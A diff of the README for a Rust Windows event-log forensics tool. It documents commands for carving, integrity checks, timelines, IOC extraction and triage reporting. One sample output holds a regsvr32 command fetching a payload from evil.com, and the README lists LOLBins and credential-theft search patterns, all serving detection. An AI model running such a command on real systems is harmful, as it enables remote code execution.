@@ -9,12 +9,18 @@
 
 **Recover the logs first. Analyze them second.**
 
-Every detection tool assumes the event log is intact. In a real incident it often isn't — cleared, truncated, partially overwritten, or encrypted mid-stream by ransomware. This library recovers what can be recovered and tells you exactly what the file's own structure says about what happened to it.
+Every detection tool assumes the event log is intact. In a real incident it often isn't — cleared, truncated, partially overwritten, or encrypted mid-stream by ransomware. `winevt-forensic` recovers what can be recovered, verifies structural integrity, and then analyzes events with threat-hunting–focused CLI commands.
 
 ```bash
 cargo install wt-cli
-wt carve /evidence/Security.evtx
-wt verify /evidence/Security.evtx
+
+# One-click triage: carve + verify + extract + hayabusa, output JSON/HTML
+wt report /evidence/Security.evtx
+
+# Analyze a directory, an E01 image, or a single EVTX file
+wt timeline /evidence/
+wt extract --ioc /evidence/Security.evtx
+wt extract --wmi /evidence/Security.evtx
 ```
 
 **[Full documentation →](https://securityronin.github.io/winevt-forensic/)**
@@ -42,42 +48,29 @@ cargo build --release
 winevt-core      = "0.1"   # types + binary format constants
 winevt-integrity = "0.1"   # structural anomaly detection
 winevt-carver    = "0.1"   # record carving from files, bytes, disk images
+winevt-analyze   = "0.1"   # timeline, sessions, frequency, IOC extraction
 ```
 
 ---
 
-## Three Things You Do With This
+## Input Auto-Detection
 
-### Recover event logs from a ransomware-hit machine
+Every `wt` subcommand accepts any of:
 
-Ransomware encrypts storage fast. Some families encrypt only a fraction of each file deliberately — speed over thoroughness. Others are interrupted by EDR, power loss, or network cut. Either way, the Security log on the victim's drive ends up partially encrypted: some chunks intact, some garbage. Every mainstream EVTX parser will fail on the first corrupt chunk and return nothing.
+| Input | What happens |
+|-------|-------------|
+| `file.evtx` | Parsed directly |
+| `directory/` | All `*.evtx` files inside are walked recursively |
+| `image.E01` / `.Ex01` | NTFS filesystem extracted; all EVTX files parsed |
+| Any other blob | Raw carve for `ElfChnk` magic; recovered chunks written to temp EVTX |
 
-```bash
-# Partial acquisition from a partially-encrypted NTFS volume
-wt carve /mnt/victim/Windows/System32/winevt/Logs/Security.evtx
-```
+Add `--carve` (global flag) to any command to additionally scan unallocated space for deleted/overwritten EVTX records.
 
-```json
-{
-  "stats": {
-    "bytes_scanned": 1114112,
-    "chunks_found": 17,
-    "chunks_valid": 14,
-    "chunks_corrupt": 3,
-    "records_recovered": 4021,
-    "records_corrupt": 12
-  },
-  "indicators": [
-    { "RecordIdGap": { "chunk_offset": 720896, "expected": 3102, "found": 3201 } }
-  ]
-}
-```
+---
 
-14 valid chunks plus partial recovery from the 3 corrupt ones. The record ID gap tells you which records were in those 3 chunks before they were hit.
+## Command Reference
 
-### Verify integrity before you trust the timeline
-
-Before running detection rules against an event log, know whether the file is structurally sound. A log that's been cleared, rolled back, or selectively edited will have structural traces that pre-date any rule match.
+### `wt verify` — integrity check before you trust the timeline
 
 ```bash
 wt verify /evidence/Security.evtx
@@ -85,66 +78,214 @@ wt verify /evidence/Security.evtx
 
 ```json
 [
+  { "ChunkChecksumMismatch": { "chunk_offset": 69632, "computed": 2881145975, "stored": 3735928559 } },
+  { "RecordIdGap": { "chunk_offset": 135168, "expected": 4097, "found": 4201 } }
+]
+```
+
+Exits 0 if clean, 1 if indicators found.
+
+---
+
+### `wt info` — file structure summary
+
+```bash
+wt info /evidence/Security.evtx
+```
+
+```json
+{
+  "file_header": { "chunk_count": 17, "next_record_id": 4312 },
+  "stats": { "chunks_found": 17, "chunks_valid": 14, "chunks_corrupt": 3, "records_recovered": 4021 },
+  "indicators": [ ... ]
+}
+```
+
+---
+
+### `wt timeline` — chronological event stream
+
+```bash
+wt timeline /evidence/Security.evtx
+wt timeline --filter-eid 4624 --after 2024-01-01T00:00:00Z --before 2024-02-01T00:00:00Z /evidence/
+wt timeline --limit 100 /evidence/Security.evtx
+wt timeline --stream /evidence/Security.evtx   # NDJSON, one event per line
+```
+
+Flags:
+- `--filter-eid <EID>` — return only events with this event ID
+- `--after <RFC3339>` — exclude events before this timestamp
+- `--before <RFC3339>` — exclude events at or after this timestamp
+- `--limit <N>` — return at most N events
+- `--stream` — NDJSON output (one JSON object per line, no wrapping array)
+
+---
+
+### `wt login` — logon session correlation
+
+```bash
+wt login /evidence/Security.evtx
+wt login --logon-type 3 /evidence/Security.evtx   # network logons only
+wt login --mermaid /evidence/Security.evtx         # Mermaid graph diagram
+```
+
+Correlates EID 4624 (logon) / 4634 (logoff) pairs into sessions with duration, source IP, username, and domain.
+
+---
+
+### `wt frequency` — event ID distribution (least-frequent-first)
+
+```bash
+wt frequency /evidence/Security.evtx
+wt frequency --process /evidence/Security.evtx    # count by process name (EID 4688)
+wt frequency --anomaly /evidence/Security.evtx    # z-score anomaly detection
+wt frequency --anomaly --min-z 3.0 /evidence/     # custom z-score threshold
+```
+
+Default order is **least-frequent-first (LFO)** — rare events surface first, which is where threats hide. To get most-frequent-first, pipe through `jq` or `sort`.
+
+```json
+{
+  "by_event_id": [
+    { "event_id": 4698, "count": 1,    "description": "Scheduled task created" },
+    { "event_id": 4769, "count": 12,   "description": "Kerberos service ticket" },
+    { "event_id": 4624, "count": 3841, "description": "Logon" }
+  ]
+}
+```
+
+---
+
+### `wt extract` — targeted indicator extraction
+
+All modes are mutually exclusive.
+
+#### IOC extraction
+
+```bash
+wt extract --ioc /evidence/Security.evtx
+```
+
+Extracts IP addresses, domain names, and file hashes from event fields. Exits 1 if any IOCs found.
+
+#### PowerShell script blocks
+
+```bash
+wt extract --powershell /evidence/Microsoft-Windows-PowerShell.evtx
+```
+
+Reassembles fragmented EID 4104 script block events. Applies basic deobfuscation (backtick removal, string concatenation). Add `--no-deobfuscate` to get raw blocks.
+
+#### WMI persistence
+
+```bash
+wt extract --wmi /evidence/Microsoft-Windows-WMI-Activity.evtx
+```
+
+Extracts EID 5857 (provider loaded), 5858 (error), 5860 (temporary subscription), 5861 (permanent subscription). EIDs 5860/5861 are the persistence-relevant events.
+
+#### Scheduled tasks
+
+```bash
+wt extract --scheduled-task /evidence/Security.evtx
+```
+
+Extracts EID 4698 (task created) and 4702 (task updated), including the raw XML `TaskContent` which may embed VBScript or JScript.
+
+#### Process command lines
+
+```bash
+wt extract --cmdline /evidence/Security.evtx
+```
+
+Extracts EID 4688 process creation events with full command lines. Flags LOLBin invocations (`wscript.exe`, `cscript.exe`, `mshta.exe`, `regsvr32.exe`, `rundll32.exe`, `certutil.exe`, `msiexec.exe`, `bitsadmin.exe`, `forfiles.exe`, `pcalua.exe`).
+
+```json
+[
   {
-    "ChunkChecksumMismatch": {
-      "chunk_offset": 69632,
-      "computed": 2881145975,
-      "stored": 3735928559
-    }
-  },
-  {
-    "RecordIdGap": {
-      "chunk_offset": 135168,
-      "expected": 4097,
-      "found": 4201
-    }
+    "timestamp": "2024-01-15T14:23:01Z",
+    "pid": 4812,
+    "parent_pid": 1234,
+    "image": "C:\\Windows\\System32\\regsvr32.exe",
+    "command_line": "regsvr32.exe /s /u /i:http://evil.com/payload.sct scrobj.dll",
+    "parent_image": "C:\\Windows\\System32\\cmd.exe",
+    "is_lolbin": true
   }
 ]
 ```
 
-These are structural facts, not forensic conclusions. The file says the checksum is wrong and records are missing. What that means — and what was in those 104 missing records — is for the analyst to determine.
+#### ATT&CK technique tags
 
-### Carve from raw bytes — disk image, memory dump, slack space
-
-```rust
-use winevt_carver::carve_from_bytes;
-
-// Works on memory dumps, unallocated disk space, raw sector reads
-let raw: Vec<u8> = std::fs::read("/dev/sda1")?;
-let result = carve_from_bytes(&raw);
-
-println!("Scanned {} bytes, found {} chunks, recovered {} records",
-    result.stats.bytes_scanned,
-    result.stats.chunks_found,
-    result.stats.records_recovered,
-);
+```bash
+wt extract --attack-tags /evidence/Security.evtx
 ```
 
-Finds `ElfChnk` magic at any 8-byte offset. No alignment assumptions. No file header required.
+Maps event IDs to MITRE ATT&CK technique IDs using built-in rules.
 
 ---
 
-## Where This Fits
+### `wt search` — full-text event search
 
-This is not a detection tool. [Hayabusa](https://github.com/Yamato-Security/hayabusa) does Sigma-based threat hunting and MITRE ATT&CK tagging far better than anything built here ever will. [Log Parser Studio](https://github.com/microsoft/LogParserStudio) has years of query infrastructure. These tools are the reason to recover your logs — so you can feed them something to work with.
+```bash
+wt search "mimikatz" /evidence/Security.evtx
+wt search --regex "lsass|sekurlsa" /evidence/Security.evtx
+wt search --stream "lateral" /evidence/
+```
 
-The problem this library solves is upstream: getting records out of files the other tools cannot open.
+---
 
-| | [winevt-forensic](https://github.com/SecurityRonin/winevt-forensic) | [evtx](https://github.com/omerbenamram/evtx) | [python-evtx](https://github.com/williballenthin/python-evtx) | [hayabusa](https://github.com/Yamato-Security/hayabusa) | [Log Parser Studio](https://github.com/microsoft/LogParserStudio) |
-|--|:-:|:-:|:-:|:-:|:-:|
-| Runs on Linux / macOS | ✅ | ✅ | ✅ | ✅ | — |
-| Single static binary | ✅ | ✅ | — | ✅ | — |
-| No Python / .NET runtime | ✅ | ✅ | — | ✅ | — |
-| Recovers corrupt chunks | ✅ | — | — | — | — |
-| Carves from raw disk / memory | ✅ | — | — | — | — |
-| CRC32 checksum verification | ✅ | — | — | — | — |
-| Record ID gap detection | ✅ | — | — | — | — |
-| JSON output | ✅ | ✅ | — | ✅ | — |
-| SQL query interface | — | — | — | — | ✅ |
-| Sigma-based detection rules | — | — | — | ✅ | — |
-| MITRE ATT&CK tagging | — | — | — | ✅ | — |
-| Free (no cost) | ✅ | ✅ | ✅ | ✅ | ✅ |
-| Open source | ✅ | ✅ | ✅ | ✅ | — |
+### `wt diff` — compare two EVTX files
+
+```bash
+wt diff before.evtx after.evtx
+```
+
+Reports events present in one file but absent from the other. Useful for comparing before/after a suspected log manipulation.
+
+---
+
+### `wt process-tree` — visualise parent-child process relationships
+
+```bash
+wt process-tree /evidence/Security.evtx
+wt process-tree --mermaid /evidence/Security.evtx
+```
+
+---
+
+### `wt repair` — recover partial EVTX files
+
+```bash
+wt repair /evidence/Security.evtx /output/Security-repaired.evtx
+```
+
+Skips chunks that fail CRC32 verification; re-sequences record IDs in surviving chunks; writes a valid EVTX file. Reports `chunks_total`, `chunks_recovered`, `chunks_skipped`, `records_recovered`.
+
+---
+
+### `wt report` — one-click triage
+
+```bash
+wt report /evidence/Security.evtx
+wt report --carved /evidence/Security.evtx      # also carve corrupt chunks
+wt report --format html -o report.html /evidence/
+wt report --hayabusa-bin /opt/hayabusa /evidence/
+```
+
+Runs: integrity check → carving (if `--carved`) → IOC extraction → ATT&CK tagging → optional Hayabusa scan → structured JSON/HTML output.
+
+---
+
+## Exit Codes
+
+| Code | Meaning |
+|------|---------|
+| 0 | Clean — no indicators / detections found |
+| 1 | Detections — IOCs, integrity violations, or suspicious events found |
+| 2 | Processing error (corrupt input, parse failure) |
+| 3 | Path not found |
+
+Scriptable: `wt verify /evidence/*.evtx; [ $? -eq 0 ] && echo "clean"`
 
 ---
 
@@ -162,7 +303,36 @@ The problem this library solves is upstream: getting records out of files the ot
 
 **Log cleared (EID 1102 / 104)** — the standard Windows event indicating the Security or System log was explicitly cleared.
 
-These are inputs to forensic reasoning. [RapidTriage](https://github.com/SecurityRonin/rapidtriage) consumes them alongside session correlation and frequency analysis to produce the interpretive layer.
+---
+
+## Where This Fits
+
+This is not a detection-rule engine. [Hayabusa](https://github.com/Yamato-Security/hayabusa) does Sigma-based threat hunting and MITRE ATT&CK tagging at scale. `wt` handles the recovery and structural analysis layer that runs before detection tools.
+
+| | [winevt-forensic](https://github.com/SecurityRonin/winevt-forensic) | [evtx](https://github.com/omerbenamram/evtx) | [python-evtx](https://github.com/williballenthin/python-evtx) | [hayabusa](https://github.com/Yamato-Security/hayabusa) | [Log Parser Studio](https://github.com/microsoft/LogParserStudio) |
+|--|:-:|:-:|:-:|:-:|:-:|
+| Runs on Linux / macOS | ✅ | ✅ | ✅ | ✅ | — |
+| Single static binary | ✅ | ✅ | — | ✅ | — |
+| No Python / .NET runtime | ✅ | ✅ | — | ✅ | — |
+| Recovers corrupt chunks | ✅ | — | — | — | — |
+| Carves from raw disk / memory | ✅ | — | — | — | — |
+| E01/EWF image support | ✅ | — | — | — | — |
+| CRC32 checksum verification | ✅ | — | — | — | — |
+| Record ID gap detection | ✅ | — | — | — | — |
+| Logon session correlation | ✅ | — | — | — | — |
+| PowerShell block extraction | ✅ | — | — | — | — |
+| WMI persistence detection | ✅ | — | — | — | — |
+| LOLBin detection | ✅ | — | — | — | — |
+| IOC extraction | ✅ | — | — | — | — |
+| LFO threat hunting | ✅ | — | — | — | — |
+| One-click triage report | ✅ | — | — | — | — |
+| JSON output | ✅ | ✅ | — | ✅ | — |
+| NDJSON streaming | ✅ | — | — | — | — |
+| SQL query interface | — | — | — | — | ✅ |
+| Sigma-based detection rules | — | — | — | ✅ | — |
+| MITRE ATT&CK tagging | ✅ | — | — | ✅ | — |
+| Free (no cost) | ✅ | ✅ | ✅ | ✅ | ✅ |
+| Open source | ✅ | ✅ | ✅ | ✅ | — |
 
 ---
 
@@ -177,15 +347,12 @@ These are inputs to forensic reasoning. [RapidTriage](https://github.com/Securit
 | [`winevt-integrity`](crates/winevt-integrity/) | Detection algorithms — `detect_record_id_gaps()`, `verify_chunk_header_checksum()`, `check_timestamp_monotonicity()`, `check_file_header_consistency()` |
 | [`winevt-carver`](crates/winevt-carver/) | EVTX chunk/record recovery from corrupt files, raw bytes, disk images. `carve_from_bytes()`, `carve_from_file()`, `verify_integrity()`. |
 | [`winevt-memory`](crates/winevt-memory/) | Types and analysis for EVTX/ETW data recovered from memory dumps. `MemoryRecoveredChunk`, `RecoveredEtwSession`, `detect_etw_tampering()`. |
-| [`wt-cli`](crates/wt-cli/) | `wt` binary — wraps `winevt-carver`, outputs JSON. |
+| [`winevt-analyze`](crates/winevt-analyze/) | Higher-level analysis — `timeline()`, `sessions()`, `frequency()`, `ioc_extract()`, `wmi_events()`, `scheduled_tasks()`, `process_cmdlines()`, `search()`, `diff()`, `process_tree()`. |
+| [`winevt-binxml`](crates/winevt-binxml/) | BinXML decode and validation utilities. |
+| [`winevt-triage`](crates/winevt-triage/) | E01/EVTX extraction pipeline for `wt report`. |
+| [`wt-cli`](crates/wt-cli/) | `wt` binary — all subcommands, JSON/NDJSON output. |
 
 </details>
-
-```toml
-# Use the carver in your own project
-[dependencies]
-winevt-carver = "0.1"
-```
 
 ---
 
@@ -196,7 +363,10 @@ graph LR
     A[winevt-core] --> B[winevt-integrity]
     B --> C[winevt-carver]
     B --> E[winevt-memory]
-    C --> D[wt-cli]
+    A --> F[winevt-analyze]
+    C --> G[wt-cli]
+    E --> G
+    F --> G
 ```
 
 ---
